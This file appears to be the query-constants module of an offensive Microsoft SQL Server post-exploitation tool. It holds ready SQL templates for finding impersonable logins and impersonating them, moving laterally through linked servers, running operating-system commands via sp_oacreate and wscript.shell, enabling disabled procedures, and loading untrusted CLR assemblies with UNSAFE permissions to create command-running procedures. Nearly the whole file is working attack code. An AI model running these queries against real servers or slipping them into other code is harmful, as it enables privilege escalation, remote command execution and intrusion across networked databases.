# Impersonation and authentication queries
CAN_IMPERSONATE_AS_SERVER_PRINCIPAL = "SELECT b.name as username FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id and a.permission_name = 'IMPERSONATE';"
CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL = "SELECT b.name as username FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id and a.permission_name = 'IMPERSONATE';"
SERVER_USER_LIST = "SELECT name as username FROM sys.server_principals WHERE type_desc LIKE '%_LOGIN' and type != 'C' and is_disabled = 0 and name NOT LIKE 'NT %' and name NOT LIKE '##MS%';"
DB_USER_LIST = "SELECT name as username FROM sys.database_principals WHERE type_desc LIKE '%_USER' AND authentication_type_desc != 'None' and name NOT LIKE '##MS%';"
GET_USER_SERVER_ROLES = "SELECT p.name AS 'group' FROM sys.server_principals p JOIN sys.server_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
GET_USER_DATABASE_ROLES = "SELECT p.name AS 'group' FROM sys.database_principals p JOIN sys.database_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}'; EXEC('[QUERY]');"
IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}'; EXEC('[QUERY]');"
DATABASE_LIST = "SELECT name FROM sys.databases WHERE database_id > 4"

# Lateral movement queries
LINKED_SERVER_LIST = "SELECT name, provider, is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;"
OPENQUERY = "SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');"
EXEC_AT = "EXEC ('{query}') AT \"{linked_server}\";"
SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
EXECUTE_PROCEDURE = "EXEC {procedure_name" \
                    "} '{command}';"
EXECUTE_FUNCTION = "SELECT {db_user}.{function_name}({command});"

SET_SERVER_OPTION = "EXEC sp_serveroption '{link_name}','{feature}','{status}';"

# General queries
SERVER_INFORMATION = "SELECT @@SERVERNAME as hostname, DEFAULT_DOMAIN() as domain_name, @@VERSION as version, @@servicename as instance_name, USER_NAME() as db_user, SYSTEM_USER as server_user, DB_NAME() AS db_name;"
TRUSTWORTHY_DB_LIST = "SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;"

# Permission checks
IS_PROCEDURE_ACCESSIBLE = "SELECT CASE WHEN OBJECT_ID('{procedure_name}', 'X') IS NOT NULL THEN 'True' ELSE 'False' END AS [is_accessible];"
IS_PROCEDURE_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = '{procedure_name}') = 1 THEN 'True' ELSE 'False' END AS [status];"

# Configuration queries
RECONFIGURE_PROCEDURE = "EXEC sp_configure '{procedure_name}', {status}; RECONFIGURE;"


# Custom assemblies queries
IS_ASSEMBLY_EXISTS = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.assemblies WHERE name = '{asm_name}') THEN 'True' ELSE 'False' END as status;"
ADD_CUSTOM_ASM = "CREATE ASSEMBLY {asm_name} FROM {custom_asm} WITH PERMISSION_SET = UNSAFE;"
IS_PROCEDURE_EXISTS = "SELECT CASE WHEN OBJECT_ID('{procedure_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
CREATE_PROCEDURE = "CREATE PROCEDURE [{procedure_name}] {args} AS EXTERNAL NAME [{asm_name}].[StoredProcedures].[{procedure_name}];"
IS_FUNCTION_EXISTS = "SELECT CASE WHEN OBJECT_ID('{function_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
CREATE_FUNCTION = "CREATE FUNCTION [{db_user}].{function_name}({args}) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {asm_name}.[{namespace}.{class_name}].{function_name};"
IS_CUSTOM_ASM_TRUSTED = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = {my_hash}) THEN 'True' ELSE 'False' END AS [status];"
TRUST_CUSTOM_ASM = "EXEC sp_add_trusted_assembly @hash = {my_hash}, @description = N'Trusted Assembly for My Application';"
UNTRUST_CUSTOM_ASM = "EXEC sp_drop_trusted_assembly @hash = {my_hash};"
DROP_PROCEDURE = "DROP PROCEDURE {procedure_name};"
DROP_CUSTOM_ASM = "DROP ASSEMBLY {asm_name};"
DROP_FUNCTION = "DROP FUNCTION {function_name};"
LDAP_QUERY = "SELECT * FROM 'LDAP://{hostname}:{port}' "
